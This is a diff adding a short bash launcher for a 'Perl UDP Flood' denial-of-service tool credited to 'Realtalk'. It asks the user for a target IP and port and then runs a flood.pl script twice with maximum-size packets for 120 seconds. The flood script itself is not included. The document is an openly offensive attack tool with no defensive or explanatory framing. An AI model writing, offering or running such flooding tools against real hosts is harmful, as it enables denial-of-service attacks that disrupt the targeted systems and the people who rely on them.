@@ -1,0 +1,13 @@
+#!/bin/bash
+clear
+echo " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
+echo " ~~~  Perl UDP Flood :   Coded By Realtalk  ~~~ "
+echo " ~~~~~~~~~~  FreeBytes Custom Flood  ~~~~~~~~~~ "
+echo " ~~~~~~~~~~~  CTRL-C To Stop Flood  ~~~~~~~~~~~ "
+echo " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
+echo "Enter IP :"
+read ip
+echo "Enter Port :"
+read port
+./flood.pl $ip $port 65500 120
+./flood.pl $ip $port 65500 120
